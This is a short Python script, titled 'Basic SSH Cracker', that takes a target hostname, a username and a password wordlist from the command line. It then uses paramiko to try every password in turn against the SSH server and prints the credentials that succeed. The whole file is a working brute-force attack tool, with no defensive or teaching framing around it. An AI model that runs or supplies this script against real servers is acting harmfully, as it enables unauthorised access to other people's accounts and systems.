import paramiko
import argparse




parser = argparse.ArgumentParser(description="Basic SSH Cracker")

parser.add_argument("-t","--target",required=True,type=str,help="Enter the hostname")
parser.add_argument("-u","--user",type=str,required=True,help="Enter the username")
parser.add_argument("-w","--wordlist",type=str,required=True,help="Enter the path to wordlist")

args = parser.parse_args()

host = args.target
user = args.user
wordlist = args.wordlist





def words(wordlist):
    with open(wordlist , 'r' , encoding='utf-8') as f:
        return[line.strip('\n') for line in f]
        


passwords = words(wordlist)



client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for password in passwords:

    try:
        client.connect(hostname=host, username=user , password=password, timeout=3)
        print("||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||")
        print("===========================================================================\n")
        print(" The Password was Found and Connection was Success\n")
        print(f"Connect with {host}  as   {user}  :   {password}\n")

        break

    except Exception as e:
        print(f" the connnection was failed with {host}  ")